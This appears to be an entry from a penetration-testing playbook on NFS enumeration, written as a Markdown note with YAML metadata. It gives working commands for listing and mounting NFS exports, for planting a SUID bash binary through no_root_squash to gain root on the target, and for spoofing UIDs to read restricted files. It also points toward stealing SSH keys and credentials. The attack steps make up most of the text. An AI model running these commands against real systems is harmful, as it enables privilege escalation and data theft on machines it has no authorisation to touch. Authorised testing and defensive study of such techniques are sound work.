---
id: nfs-enum
title: NFS Enumeration
stage: enumeration
tags: [linux, nfs]
summary: List and mount NFS exports — no_root_squash and UID spoofing are both direct paths to reading restricted files or planting SUID binaries.
leads_to:
  - ssh-access
  - linux-suid-caps
  - rev-shell
---

## Prerequisites

Port 2049 open. No credentials required — NFS relies on IP-based access control, not passwords.

NFS exports are either unrestricted (world-mountable) or IP-filtered. If you can mount a share, you either get direct file access or, with `no_root_squash`, the ability to create SUID binaries as root from your attacker machine. Even without `no_root_squash`, UID spoofing (creating a local user with the same UID as the file owner) bypasses ACLs on restricted files.

## Quick Win

> List exports — shows what's shared and to whom.

```bash
showmount -e $TARGET
```

## Mount the Share

> Mount and browse content — treat it like a local filesystem.

```bash
sudo mkdir /mnt/nfs
sudo mount -o rw,vers=2 $TARGET:/share /mnt/nfs
sudo mount -t nfs $TARGET:/share /mnt/nfs
# Try v3 if v2 fails: mount -t nfs -o vers=3 $TARGET:/share /mnt/nfs
```

## no_root_squash Exploitation

> Your attacker-side root becomes root on the share — plant a SUID bash.

```bash
# On attacker (as root)
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# On target — execute the planted binary
/share/bash -p   # -p preserves SUID context
```

## UID Spoofing (Without no_root_squash)

> Files owned by UID 1001? Create a local user with UID 1001 and you own them.

```bash
# Check ownership of interesting files on the mount
ls -lan /mnt/nfs/

# Create matching UID on attacker
sudo useradd -u 1001 fakeusr
sudo su fakeusr
cat /mnt/nfs/restricted_file
```

## Leads To

SSH key found in home directory export → ssh-access immediately. `no_root_squash` on a user home → plant SUID binary → linux-suid-caps. Configuration files with credentials → try against SSH and other services.
